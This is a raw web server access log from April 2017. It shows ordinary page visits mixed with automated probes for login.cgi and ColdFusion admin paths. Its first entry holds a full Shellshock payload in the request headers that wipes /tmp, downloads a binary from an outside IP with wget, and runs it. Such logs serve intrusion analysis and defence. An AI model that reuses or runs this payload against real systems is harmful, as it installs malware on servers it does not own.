23.235.161.102 - - [15/Apr/2017:22:57:47 +0000] "GET / HTTP/1.1" 502 181 "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://103.242.2.85/synhz -O /tmp/China.Z-kkmr  >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-kkmr  >> /tmp/Run.sh;echo /tmp/China.Z-kkmr  >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://103.242.2.85/synhz -O /tmp/China.Z-kkmr  >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-kkmr  >> /tmp/Run.sh;echo /tmp/China.Z-kkmr  >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22"
185.27.217.34 - - [16/Apr/2017:00:19:25 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
42.93.158.20 - - [16/Apr/2017:02:11:40 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
118.212.32.225 - - [16/Apr/2017:02:17:51 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
120.33.9.82 - - [16/Apr/2017:02:54:06 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
23.91.241.182 - - [16/Apr/2017:02:59:05 +0000] "GET / HTTP/1.1" 200 2762 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:02:59:07 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:02:24 +0000] "GET / HTTP/1.1" 200 2763 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:02:56 +0000] "GET / HTTP/1.1" 200 2763 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:02:57 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:07:13 +0000] "GET / HTTP/1.1" 200 2763 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
124.13.76.56 - - [16/Apr/2017:03:13:26 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
23.91.241.182 - - [16/Apr/2017:03:19:35 +0000] "GET / HTTP/1.1" 200 2747 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:20:43 +0000] "GET / HTTP/1.1" 200 2766 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:22:51 +0000] "GET / HTTP/1.1" 200 2775 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:25:03 +0000] "GET / HTTP/1.1" 200 2775 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
73.0.179.208 - - [16/Apr/2017:03:33:16 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
73.0.179.208 - - [16/Apr/2017:03:33:20 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
73.0.179.208 - - [16/Apr/2017:03:33:22 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
73.0.179.208 - - [16/Apr/2017:03:33:30 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
73.0.179.208 - - [16/Apr/2017:03:33:46 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
188.36.250.14 - - [16/Apr/2017:03:34:38 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
188.120.152.198 - - [16/Apr/2017:03:40:49 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
23.91.241.182 - - [16/Apr/2017:03:45:59 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:46:16 +0000] "GET / HTTP/1.1" 200 2780 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:47:20 +0000] "GET / HTTP/1.1" 200 2780 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:47:28 +0000] "GET / HTTP/1.1" 200 2780 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:03:52:40 +0000] "GET / HTTP/1.1" 200 2838 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:04:06:16 +0000] "GET / HTTP/1.1" 200 2851 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:04:15:34 +0000] "GET / HTTP/1.1" 200 2786 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [16/Apr/2017:04:17:10 +0000] "GET / HTTP/1.1" 200 2851 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
180.165.42.234 - - [16/Apr/2017:04:37:36 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
51.15.6.171 - - [16/Apr/2017:04:50:12 +0000] "GET /CFIDE/administrator/ HTTP/1.1" 502 181 "-" "-"
